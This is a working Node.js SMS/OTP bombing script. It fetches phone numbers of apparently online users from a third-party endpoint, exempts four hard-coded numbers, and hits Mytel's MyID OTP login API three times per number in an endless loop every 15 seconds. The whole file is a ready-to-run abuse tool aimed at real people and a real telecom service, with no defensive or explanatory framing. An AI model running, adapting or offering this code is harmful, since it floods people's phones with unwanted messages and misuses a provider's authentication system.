const axios = require("axios");
const FormData = require("form-data");

// ❌ Blocked numbers (no OTP)
const blockList = [
  "09687071269",
  "09670871425",
  "09664810586",
  "09681307197"
];

// ✅ Random phone (for form data)
function randomPhone() {
    return "096" + Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
}

// ✅ Get online users list
async function fetchOnlineUsers() {
    try {
        const form = new FormData();
        form.append("phone", randomPhone());

        const response = await axios.post("https://ironcoder.site/ironmyid/online_users.php", form, {
            headers: form.getHeaders(),
            timeout: 10000, // 10 seconds timeout
        });

        const data = response.data;
        if (!data || !data.success) {
            console.warn("⚠️ Server responded but 'success' was false.");
            return [];
        }

        if (!Array.isArray(data.online_users)) {
            console.warn("⚠️ Unexpected response structure. No valid 'online_users'.");
            return [];
        }

        console.log(`🌐 Total online users: ${data.total_online_users || data.online_users.length}`);
        return data.online_users;
    } catch (error) {
        if (error.code === 'ECONNABORTED') {
            console.error("⏱ Timeout error while fetching users.");
        } else if (error.response) {
            console.error(`❌ Server error (${error.response.status}):`, error.response.data);
        } else {
            console.error(`❌ Fetch failed: ${error.message}`);
        }
        return [];
    }
}

// ✅ Send OTP x3
async function sendOtp(phone) {
    for (let i = 0; i < 3; i++) {
        try {
            const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
            const res = await axios.get(url, { timeout: 8000 });

            if (res.status === 200) {
                console.log(`✅ (${i + 1}/3) OTP sent to ${phone}`);
            } else {
                console.warn(`⚠️ (${i + 1}/3) Unexpected response for ${phone}: Status ${res.status}`);
            }
        } catch (error) {
            if (error.code === 'ECONNABORTED') {
                console.error(`⏱ (${i + 1}/3) Timeout for ${phone}`);
            } else if (error.response) {
                console.error(`❌ (${i + 1}/3) Error ${error.response.status} for ${phone}:`, error.response.data);
            } else {
                console.error(`❌ (${i + 1}/3) Unknown error for ${phone}:`, error.message);
            }
        }
    }
}

// ✅ One full round
async function loopOnce() {
    const phones = await fetchOnlineUsers();
    let successCount = 0;

    for (const phone of phones) {
        if (blockList.includes(phone)) {
            console.log(`⏭ Skipped: ${phone} (in block list)`);
            continue;
        }

        await sendOtp(phone);
        successCount++;
    }

    console.log(`✅ Round complete. Sent OTP to ${successCount} users.\n`);
}

// 🔁 Continuous loop
async function loopForever() {
    while (true) {
        await loopOnce();
        console.log("🔄 Waiting 15s...\n");
        await new Promise(r => setTimeout(r, 15000));
    }
}

loopForever();
